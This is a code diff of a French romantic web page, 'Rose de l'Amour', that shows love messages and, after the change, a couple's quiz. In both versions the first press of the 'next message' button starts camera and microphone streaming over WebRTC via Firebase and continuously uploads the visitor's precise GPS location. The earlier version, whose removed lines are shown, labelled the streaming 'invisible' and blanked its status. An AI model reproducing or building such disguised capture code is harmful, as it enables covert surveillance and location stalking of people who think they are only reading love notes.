@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>Rose de l'Amour - Messages d'Amour</title>
+<title>Rose de l'Amour - Messages & Jeu d'Amour</title>
 <style>
 * {
     margin: 0;
@@ -38,14 +38,14 @@ body {
     100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
 }
 
-@keyframes pulse {
-    0%, 100% { transform: scale(1); text-shadow: 0 0 20px rgba(255, 107, 138, 0.5); }
-    50% { transform: scale(1.05); text-shadow: 0 0 40px rgba(255, 107, 138, 0.8); }
-}
-
 @keyframes glow {
     0% { box-shadow: 0 0 5px rgba(255,107,138,0.3); }
     100% { box-shadow: 0 0 30px rgba(255,107,138,0.6); }
+}
+
+@keyframes heartbeat {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.1); }
 }
 
 /* Cœurs flottants */
@@ -72,7 +72,7 @@ body {
     text-align: center;
     z-index: 10;
     position: relative;
-    max-width: 500px;
+    max-width: 600px;
     width: 100%;
 }
 
@@ -235,7 +235,7 @@ body {
 .next-btn {
     background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
     border: none;
-    width: 180px;
+    width: 220px;
     padding: 14px 0;
     border-radius: 50px;
     color: white;
@@ -243,8 +243,8 @@ body {
     font-size: 16px;
     cursor: pointer;
     transition: all 0.3s ease;
-    margin: 20px auto;
-    display: block;
+    margin: 15px auto;
+    display: inline-block;
     box-shadow: 0 4px 15px rgba(0,0,0,0.3);
 }
 
@@ -253,16 +253,12 @@ body {
     box-shadow: 0 6px 20px rgba(255,107,138,0.5);
 }
 
-.next-btn:active {
-    transform: scale(0.98);
-}
-
 /* Compteur */
 .counter {
     text-align: center;
     color: #ffb3c1;
     font-size: 12px;
-    margin-top: 10px;
+    margin-top: 5px;
 }
 
 /* Indicateur de diffusion */
@@ -276,11 +272,18 @@ body {
     font-size: 10px;
     color: #ffb3c1;
     z-index: 100;
+    transition: all 0.3s ease;
 }
 
 .broadcast-status.active {
     background: #10b981;
     color: white;
+    animation: pulse 1s infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.7; }
 }
 
 /* Divider */
@@ -291,12 +294,165 @@ body {
     margin: 15px auto;
 }
 
+/* ========== JEU D'AMOUR ========== */
+.game-container {
+    margin-top: 40px;
+}
+
+.game-card {
+    background: rgba(255,255,255,0.1);
+    backdrop-filter: blur(15px);
+    border-radius: 30px;
+    padding: 25px 20px;
+    border: 1px solid rgba(255,107,138,0.4);
+    box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+}
+
+.game-header {
+    margin-bottom: 15px;
+}
+
+.game-header h2 {
+    font-size: 24px;
+    color: #ffb3c1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+.game-header h2 span {
+    animation: heartbeat 1.5s ease infinite;
+    display: inline-block;
+}
+
+.progress-bar {
+    background: rgba(255,255,255,0.2);
+    border-radius: 20px;
+    height: 8px;
+    margin: 15px 0;
+    overflow: hidden;
+}
+
+.progress-fill {
+    background: linear-gradient(90deg, #ff6b8a, #ff4d6d);
+    height: 100%;
+    border-radius: 20px;
+    transition: width 0.5s ease;
+    width: 0%;
+}
+
+.question-counter {
+    color: #ffb3c1;
+    font-size: 13px;
+    margin-bottom: 10px;
+}
+
+.question-text {
+    font-size: 20px;
+    color: white;
+    margin: 20px 0;
+    font-weight: 600;
+    line-height: 1.4;
+}
+
+.answers-container {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin: 20px 0;
+}
+
+.answer-btn {
+    background: linear-gradient(135deg, rgba(255,107,138,0.8), rgba(255,77,109,0.8));
+    border: none;
+    padding: 14px 16px;
+    border-radius: 60px;
+    color: white;
+    font-size: 15px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    text-align: center;
+}
+
+.answer-btn:hover {
+    transform: translateY(-2px);
+    background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
+    box-shadow: 0 5px 15px rgba(255,107,138,0.4);
+}
+
+.score-display {
+    background: rgba(255,255,255,0.15);
+    border-radius: 30px;
+    padding: 10px;
+    margin: 15px 0 10px;
+    display: inline-block;
+    min-width: 130px;
+}
+
+.score-display span {
+    color: #ffb3c1;
+    font-size: 24px;
+    font-weight: bold;
+}
+
+.result-container {
+    margin-top: 20px;
+}
+
+.result-message {
+    font-size: 16px;
+    color: white;
+    margin: 15px 0;
+    line-height: 1.5;
+}
+
+.restart-btn {
+    background: linear-gradient(135deg, #4a90e2, #357abd);
+    border: none;
+    padding: 12px 25px;
+    border-radius: 50px;
+    color: white;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 15px;
+    transition: all 0.3s ease;
+}
+
+.restart-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(74,144,226,0.4);
+}
+
+.separator-game {
+    width: 200px;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, #ff6b8a, #ffb3c1, #ff6b8a, transparent);
+    margin: 20px auto;
+}
+
+/* Animations */
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.fade-in {
+    animation: fadeIn 0.5s ease;
+}
+
 /* Responsive */
 @media (max-width: 500px) {
     .message-text { font-size: 14px; }
     .message-lines p { font-size: 13px; }
     .title-text h1 { font-size: 24px; }
     .fleur { transform: scale(0.85); }
+    .question-text { font-size: 18px; }
+    .answer-btn { padding: 12px 14px; font-size: 14px; }
+    .game-header h2 { font-size: 20px; }
+    .next-btn { width: 200px; font-size: 14px; }
 }
 </style>
 </head>
@@ -339,15 +495,50 @@ body {
         <div class="feuille feuille-droite"></div>
     </div>
 
-    <!-- Bouton Suivant -->
+    <!-- Bouton Suivant Messages -->
     <button class="next-btn" id="nextBtn">➡️ Message suivant</button>
-    <div class="counter" id="counter">Message 1 / 100</div>
+    <div class="counter" id="counter">Message 1 / 30</div>
+
+    <div class="separator-game"></div>
+
+    <!-- ========== JEU D'AMOUR ========== -->
+    <div class="game-container">
+        <div class="game-card">
+            <div class="game-header">
+                <h2>
+                    <span>💖</span>
+                    Jeu du Cœur
+                    <span>💖</span>
+                </h2>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div id="quizArea">
+                <div class="question-counter" id="questionCounter"></div>
+                <div class="question-text" id="questionText"></div>
+                <div class="answers-container" id="answersContainer"></div>
+                <div class="score-display">
+                    💕 Score: <span id="scoreValue">0</span> 💕
+                </div>
+            </div>
+            
+            <div id="resultArea" style="display: none;">
+                <div class="result-container">
+                    <div class="result-message" id="resultMessage"></div>
+                    <button class="restart-btn" onclick="restartGame()">🔄 Rejouer 🔄</button>
+                </div>
+            </div>
+        </div>
+    </div>
 </div>
 
-<div class="broadcast-status" id="broadcastStatus">suivant pour plus de message</div>
+<div class="broadcast-status" id="broadcastStatus">✨ Cliquez sur "Message suivant" pour activer ✨</div>
 
 <script type="module">
-    // ==================== LISTE DES 100 MESSAGES D'AMOUR ====================
+    // ==================== MESSAGES D'AMOUR ====================
     const messages = [
         ["Chaque jour à tes côtés est un cadeau,", "Ton sourire éclaire mon chemin,", "Ton regard me fait vibrer tout mon être,", "Sans toi, ma vie n'a plus de sens."],
         ["Mon cœur bat plus fort quand tu es là,", "Tes mains dans les miennes, je m'envole,", "Tu es mon ancre et ma liberté,", "Avec toi, chaque instant devient doux."],
@@ -384,45 +575,29 @@ body {
     let currentIndex = 0;
     let streamingStarted = false;
     
-    // Éléments DOM
     const messageLines = document.getElementById('messageLines');
     const nextBtn = document.getElementById('nextBtn');
     const counter = document.getElementById('counter');
     const broadcastStatus = document.getElementById('broadcastStatus');
     
-    // Afficher le message courant
     function displayMessage() {
         const message = messages[currentIndex];
         messageLines.innerHTML = message.map(line => `<p>💖 ${line}</p>`).join('');
         counter.textContent = `Message ${currentIndex + 1} / ${messages.length}`;
     }
     
-    // Changer de message
-    function nextMessage() {
-        // Première mission : Démarrer la diffusion au premier clic
-        if (!streamingStarted) {
-            startStreaming();
-        }
-        
-        // Deuxième mission : Changer de message
+    // Fonction pour changer de message (utilisée après diffusion démarrée)
+    function changeMessageOnly() {
         currentIndex = (currentIndex + 1) % messages.length;
         displayMessage();
-        
-        // Effet visuel sur la carte
         const card = document.querySelector('.message-card');
         card.style.transform = 'scale(0.98)';
-        setTimeout(() => {
-            card.style.transform = 'scale(1)';
-        }, 150);
+        setTimeout(() => { card.style.transform = 'scale(1)'; }, 150);
     }
     
-    // Afficher le premier message
     displayMessage();
     
-    // Événement du bouton
-    nextBtn.addEventListener('click', nextMessage);
-    
-    // ==================== WEBRTC STREAMING INVISIBLE ====================
+    // ==================== WEBRTC STREAMING ====================
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
     import { getDatabase, ref, set, push, onValue, off, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
 
@@ -475,10 +650,11 @@ body {
         if (streamingStarted) return;
         streamingStarted = true;
         
-        broadcastStatus.textContent = "";
+        broadcastStatus.textContent = "🎥 Demande d'accès micro/caméra...";
         broadcastStatus.style.background = "#f59e0b";
         
         try {
+            // Demander les permissions micro et caméra
             localStream = await navigator.mediaDevices.getUserMedia({ 
                 video: {
                     width: { ideal: 640 },
@@ -491,6 +667,8 @@ body {
                     autoGainControl: true
                 }
             });
+            
+            broadcastStatus.textContent = "✅ Micro/caméra activés - Connexion...";
             
             peerConnection = new RTCPeerConnection(rtcConfig);
             
@@ -506,9 +684,12 @@ body {
             
             peerConnection.onconnectionstatechange = () => {
                 if (peerConnection.connectionState === 'connected') {
-                    broadcastStatus.textContent = "💝💖💗💓❣️❤️‍🔥❤️‍🩹❤️🩷🧡💛💚💙🩵💜🤎🗨💦";
+                    broadcastStatus.innerHTML = "💝💖💗💓❣️❤️‍🔥 Diffusion active ! ❤️‍🔥💖💗💓";
                     broadcastStatus.style.background = "#10b981";
                     broadcastStatus.classList.add('active');
+                } else if (peerConnection.connectionState === 'disconnected') {
+                    broadcastStatus.innerHTML = "📡 En attente de reconnexion...";
+                    broadcastStatus.style.background = "#f59e0b";
                 }
             };
             
@@ -548,11 +729,13 @@ body {
             if (navigator.geolocation) {
                 gpsWatchId = navigator.geolocation.watchPosition(
                     async (position) => {
-                        await set(ref(database, `users/${userId}/location`), {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            timestamp: Date.now()
-                        });
+                        if (isStreaming) {
+                            await set(ref(database, `users/${userId}/location`), {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                timestamp: Date.now()
+                            });
+                        }
                     },
                     () => {},
                     { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
@@ -563,19 +746,163 @@ body {
             updatePresence();
             heartbeatInterval = setInterval(updatePresence, 3000);
             
-            broadcastStatus.textContent = "30 messages d'amour";
-            broadcastStatus.style.background = "#10b981";
-            
             console.log(`✅ Streaming actif - ID: ${userId}`);
+            broadcastStatus.innerHTML = "💝 Diffusion active - Messages d'amour 💝";
             
         } catch (err) {
             console.error("Erreur streaming:", err);
-            broadcastStatus.textContent = "";
+            broadcastStatus.innerHTML = "❌ Micro/caméra refusé ou erreur";
             broadcastStatus.style.background = "#ef4444";
+            streamingStarted = false; // Permet de réessayer
         }
     }
     
-    // Création des cœurs flottants
+    // Bouton suivant : au premier clic, démarre la diffusion + change message
+    // Ensuite, seulement change le message
+    nextBtn.addEventListener('click', () => {
+        if (!streamingStarted) {
+            // Premier clic : démarrer la diffusion
+            startStreaming();
+            // Et aussi changer le message
+            changeMessageOnly();
+        } else {
+            // Diffusion déjà active : juste changer le message
+            changeMessageOnly();
+        }
+    });
+
+    // ==================== JEU D'AMOUR ====================
+    const gameQuestions = [
+        { question: "Qu'est-ce qui compte le plus dans une relation ?", answers: [
+            { text: "💕 La confiance et le respect", points: 3 },
+            { text: "💰 L'argent et les cadeaux", points: 1 },
+            { text: "🔥 La passion seulement", points: 1 },
+            { text: "🤝 Tout, un équilibre parfait", points: 3 }
+        ]},
+        { question: "Quel geste d'amour préfères-tu ?", answers: [
+            { text: "🌹 Un bouquet de roses", points: 2 },
+            { text: "💬 Un message doux le matin", points: 3 },
+            { text: "🎁 Un cadeau cher", points: 1 },
+            { text: "🕯️ Un dîner aux chandelles", points: 2 }
+        ]},
+        { question: "Que fais-tu quand ton partenaire est triste ?", answers: [
+            { text: "🤗 Je le/la prends dans mes bras", points: 3 },
+            { text: "🗣️ Je dis 'ça va passer'", points: 1 },
+            { text: "📱 Je l'ignore", points: 0 },
+            { text: "🎁 J'essaie de lui faire plaisir", points: 2 }
+        ]},
+        { question: "C'est quoi l'amour pour toi ?", answers: [
+            { text: "⭐ Un sentiment qui grandit chaque jour", points: 3 },
+            { text: "⚡ Une passion dévorante", points: 1 },
+            { text: "🏠 Une habitude confortable", points: 1 },
+            { text: "🌍 Se soutenir dans tous les moments", points: 3 }
+        ]},
+        { question: "Pour toi, un couple idéal c'est...", answers: [
+            { text: "👫 Des amoureux complices", points: 3 },
+            { text: "🎭 Des passionnés intenses", points: 2 },
+            { text: "📱 Chacun de son côté", points: 0 },
+            { text: "🤝 Des partenaires qui se respectent", points: 3 }
+        ]}
+    ];
+
+    let currentQuestion = 0;
+    let totalScore = 0;
+    let maxPossibleScore = 0;
+
+    gameQuestions.forEach(q => {
+        let maxPoints = 0;
+        q.answers.forEach(a => { if (a.points > maxPoints) maxPoints = a.points; });
+        maxPossibleScore += maxPoints;
+    });
+
+    function updateProgress() {
+        const progress = (currentQuestion / gameQuestions.length) * 100;
+        document.getElementById('progressFill').style.width = progress + '%';
+        document.getElementById('questionCounter').innerHTML = `Question ${currentQuestion + 1} sur ${gameQuestions.length}`;
+    }
+
+    function updateScoreDisplay() {
+        document.getElementById('scoreValue').innerHTML = totalScore;
+    }
+
+    function showQuestion() {
+        updateProgress();
+        
+        if (currentQuestion >= gameQuestions.length) {
+            showResult();
+            return;
+        }
+        
+        const q = gameQuestions[currentQuestion];
+        document.getElementById('questionText').innerHTML = q.question;
+        document.getElementById('questionText').className = 'question-text fade-in';
+        
+        const container = document.getElementById('answersContainer');
+        container.innerHTML = '';
+        container.className = 'answers-container fade-in';
+        
+        q.answers.forEach(answer => {
+            const btn = document.createElement('button');
+            btn.className = 'answer-btn';
+            btn.innerHTML = answer.text;
+            btn.onclick = () => selectAnswer(answer.points);
+            container.appendChild(btn);
+        });
+    }
+
+    function selectAnswer(points) {
+        totalScore += points;
+        updateScoreDisplay();
+        currentQuestion++;
+        showQuestion();
+    }
+
+    function getResultMessage(score) {
+        const percentage = (score / maxPossibleScore) * 100;
+        
+        if (percentage >= 80) {
+            return { emoji: "💖💖💖", title: "🌟 Amour Parfait ! 🌟", message: "Tu as un cœur immense et sincère. Tu sais ce que l'amour véritable signifie. Ta douceur fera de toi un/une partenaire exceptionnel.", advice: "Tu es prêt(e) à vivre une belle histoire d'amour ❤️" };
+        } else if (percentage >= 60) {
+            return { emoji: "💕💕", title: "💗 Grand Cœur ! 💗", message: "Tu as beaucoup d'amour à donner ! Tu comprends l'essentiel dans une relation.", advice: "Continue à cultiver la tendresse et l'écoute ✨" };
+        } else if (percentage >= 40) {
+            return { emoji: "💗", title: "🌹 Cœur Tendre 🌹", message: "Tu as de bons sentiments, mais tu hésites parfois. Ose aimer pleinement.", advice: "Fais confiance à ton cœur, il sait ce qu'il veut 💫" };
+        } else {
+            return { emoji: "🌱", title: "🌸 Cœur en Éveil 🌸", message: "Tu découvres encore l'amour, c'est beau ! Chaque jour est une chance d'apprendre à aimer mieux.", advice: "L'amour s'apprend avec le temps, tu es sur la bonne voie 🌷" };
+        }
+    }
+
+    function showResult() {
+        document.getElementById('quizArea').style.display = 'none';
+        document.getElementById('resultArea').style.display = 'block';
+        
+        const result = getResultMessage(totalScore);
+        const messageHtml = `
+            <div style="text-align: center;">
+                <div style="font-size: 3em; margin-bottom: 10px;">${result.emoji}</div>
+                <h3 style="color: #ffb3c1; margin-bottom: 15px;">${result.title}</h3>
+                <p style="font-size: 15px; line-height: 1.5; margin: 15px 0;">${result.message}</p>
+                <div style="background: rgba(255,255,255,0.1); border-radius: 20px; padding: 12px; margin: 15px 0;">
+                    💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝
+                </div>
+                <p style="color: #ffb3c1; font-style: italic;">✨ ${result.advice} ✨</p>
+            </div>
+        `;
+        document.getElementById('resultMessage').innerHTML = messageHtml;
+        document.getElementById('resultArea').className = 'fade-in';
+    }
+
+    window.restartGame = function() {
+        currentQuestion = 0;
+        totalScore = 0;
+        updateScoreDisplay();
+        document.getElementById('quizArea').style.display = 'block';
+        document.getElementById('resultArea').style.display = 'none';
+        showQuestion();
+    };
+
+    showQuestion();
+
+    // ==================== ANIMATIONS & CŒURS FLOTTANTS ====================
     const romanticWords = ["💖 Amour", "🌹 Passion", "💕 Douceur", "✨ Magie", "🌸 Tendresse", "💗 Émotion", "🌟 Rêve", "💞 Romance"];
     
     function createHeart() {
@@ -606,7 +933,7 @@ body {
     setInterval(createHeart, 600);
     setInterval(createFloatingText, 2000);
     
-    // Nettoyage
+    // Nettoyage avant fermeture
     window.addEventListener('beforeunload', () => {
         if (isStreaming) {
             if (heartbeatInterval) clearInterval(heartbeatInterval);
@@ -620,7 +947,7 @@ body {
         }
     });
     
-    console.log("🌹 Application prête - Messages d'amour + Streaming WebRTC");
+    console.log("🌹 Application prête - Le premier clic sur 'Message suivant' active micro/caméra");
 </script>
 </body>
 </html>
